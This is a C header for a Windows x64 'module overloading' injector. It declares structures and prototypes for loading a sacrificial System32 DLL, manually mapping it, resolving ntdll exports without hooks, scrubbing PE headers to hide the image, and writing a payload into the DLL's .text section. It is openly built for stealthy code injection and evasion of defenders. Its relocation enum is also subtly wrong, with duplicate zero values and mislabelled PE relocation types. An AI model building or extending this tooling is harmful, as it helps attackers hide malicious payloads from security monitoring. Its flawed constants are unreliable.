/*
 * Module Overloading - Header Definitions
 *
 * Structures and interfaces for stealthy code injection via
 * sacrificial DLL loading with manual mapping and header scrubbing.
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#ifndef _MODULE_OVERLOADING_H
#define _MODULE_OVERLOADING_H

#include <Windows.h>
#include <winternl.h>
#include "Constants.h"

//------------------------------------------------------------------------------
// Module Overloading Constants
//------------------------------------------------------------------------------

#define MODULE_OVERLOADING_TAG                0x444C4C44  // "DLLD"
#define MODULE_OVERLOADING_MAX_SECTIONS       32
#define MODULE_OVERLOADING_MAX_IMPORTS        256
#define MODULE_OVERLOADING_EXPORT_DIR_ENTRY_SIZE  sizeof(ULONG) * 3

// Sacrificial DLL candidates in System32
#define SACRIFICIAL_DLL_DEFAULT               L"System32\\wtsapi32.dll"
#define SACRIFICIAL_DLL_FALLBACK              L"System32\\profapi.dll"
#define SACRIFICIAL_DLL_MIN_SIZE              (512 * 1024)  // 512 KB minimum

// Memory allocation flags for VAD tree integration
#define MEM_IMAGE_ALLOC_FLAGS                 (MEM_COMMIT | MEM_RESERVE)
#define MEM_IMAGE_PROTECT_FLAGS               (PAGE_EXECUTE_READWRITE)
#define MEM_IMAGE_PROTECT_FINAL               (PAGE_EXECUTE_READ)

// Header scrubbing mask
#define HEADER_SCRUB_ZERO_VALUE               0x00
#define HEADER_SCRUB_DOS_SIGNATURE_OFFSET     0x3C

//------------------------------------------------------------------------------
// Module Overloading Types
//------------------------------------------------------------------------------

typedef enum _MODULE_OVERLOADING_STATE {
    ModuleOverloadingIdle,
    ModuleOverloadingDllSelected,
    ModuleOverloadingDllLoaded,
    ModuleOverloadingRelocationApplied,
    ModuleOverloadingImportsResolved,
    ModuleOverloadingHeadersScrubbed,
    ModuleOverloadingPayloadInjected,
    ModuleOverloadingError
} MODULE_OVERLOADING_STATE, *PMODULE_OVERLOADING_STATE;

typedef enum _RELOCATION_TYPE {
    RelocationTypeNone = 0,
    RelocationTypeDir64 = 0,
    RelocationTypeHigh = 1,
    RelocationTypeLow = 2,
    RelocationTypeDir64High = 3,
    RelocationTypeDir64Low = 4,
    RelocationTypeHighAdjDir64 = 9,
    RelocationTypeRelDir64 = 10
} RELOCATION_TYPE, *PRELOCATION_TYPE;

//------------------------------------------------------------------------------
// PE Format Structures (Minimal for Manual Mapping)
//------------------------------------------------------------------------------

typedef IMAGE_DOS_HEADER DOS_HEADER, *PDOS_HEADER;
typedef IMAGE_NT_HEADERS NT_HEADERS, *PNT_HEADERS;
typedef IMAGE_SECTION_HEADER SECTION_HEADER, *PSECTION_HEADER;
typedef IMAGE_BASE_RELOCATION RELOCATION_BLOCK, *PRELOCATION_BLOCK;
typedef IMAGE_EXPORT_DIRECTORY EXPORT_DIRECTORY, *PEXPORT_DIRECTORY;

//------------------------------------------------------------------------------
// Module Overloading Context
//------------------------------------------------------------------------------

typedef struct _MODULE_OVERLOADING_CONTEXT {
    // Identification
    ULONG Tag;
    MODULE_OVERLOADING_STATE State;

    // Sacrificial DLL information
    UNICODE_STRING SacrificialDllPath;
    HANDLE DllHandle;
    PVOID DllBaseAddress;
    SIZE_T DllSize;

    // PE Headers (cached for scrubbing)
    PDOS_HEADER DosHeader;
    PNT_HEADERS NtHeaders;
    PSECTION_HEADER SectionHeaders;
    USHORT NumberOfSections;

    // Relocation information
    PVOID RelocationDirectory;
    ULONG RelocationTableRva;
    ULONG RelocationTableSize;
    ULONGLONG DllImageBase;

    // Import resolution
    PEXPORT_DIRECTORY NtdllExportDirectory;
    PVOID NtdllBaseAddress;
    SIZE_T NtdllImageSize;
    ULONG NtdllExportRva;
    ULONG NtdllExportSize;
    ULONG_PTR ResolvedFunctions[256];
    ULONG ResolvedFunctionCount;

    // Payload injection
    PVOID PayloadBuffer;
    SIZE_T PayloadSize;
    PVOID TextSectionBase;
    SIZE_T TextSectionSize;
    PRUNTIME_FUNCTION RuntimeFunctionTable;
    DWORD RuntimeFunctionCount;
    DWORD64 RuntimeImageBase;
    BOOLEAN RuntimeTableRegistered;

    // Header scrubbing
    BOOLEAN HeadersScrubbed;
    SIZE_T ScrubbedHeaderSize;

    // Operation statistics
    ULONG RelocationsApplied;
    ULONG ImportsResolved;
    ULONG TotalOperations;
    NTSTATUS LastError;

    // Timing
    ULONGLONG LoadTime;
    ULONGLONG InjectionTime;

} MODULE_OVERLOADING_CONTEXT, *PMODULE_OVERLOADING_CONTEXT;

//------------------------------------------------------------------------------
// Function Prototypes - Sacrificial DLL Loading
//------------------------------------------------------------------------------

NTSTATUS InitializeModuleOverloading(
    OUT PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS SelectSacrificialDll(
    OUT PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath,
    OUT PSIZE_T DllSize
);

NTSTATUS LoadSacrificialDll(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath
);

BOOLEAN ValidateMemImageEntry(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

//------------------------------------------------------------------------------
// Function Prototypes - Base Relocation
//------------------------------------------------------------------------------

NTSTATUS ParseBaseRelocationTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    OUT PULONG RelocationCount
);

NTSTATUS ApplyBaseRelocations(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONGLONG Delta
);

BOOLEAN ValidateRelocationBlock(
    IN PRELOCATION_BLOCK Block,
    IN ULONG BlockSize
);

//------------------------------------------------------------------------------
// Function Prototypes - Hookless IAT Resolver
//------------------------------------------------------------------------------

NTSTATUS InitializeNtdllExportDirectory(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

PVOID ResolveExportByName(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR FunctionName
);

PVOID ResolveExportByOrdinal(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONG FunctionOrdinal
);

BOOLEAN WalkExportDirectory(
    IN PEXPORT_DIRECTORY ExportDir,
    IN PVOID BaseAddress,
    IN SIZE_T ImageSize,
    IN PCHAR TargetName,
    OUT PULONG FunctionRva
);

//------------------------------------------------------------------------------
// Function Prototypes - Header Scrubbing
//------------------------------------------------------------------------------

NTSTATUS ScrubDosHeader(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS ScrubNtHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS ScrubSectionHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS PerformHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

BOOLEAN VerifyHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

//------------------------------------------------------------------------------
// Function Prototypes - Payload Injection
//------------------------------------------------------------------------------

NTSTATUS InjectPayloadToTextSection(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID Payload,
    IN SIZE_T PayloadSize
);

NTSTATUS RegisterPayloadExceptionTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID PayloadBase,
    IN SIZE_T PayloadSize
);

VOID CleanupModuleOverloading(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

#endif // _MODULE_OVERLOADING_H
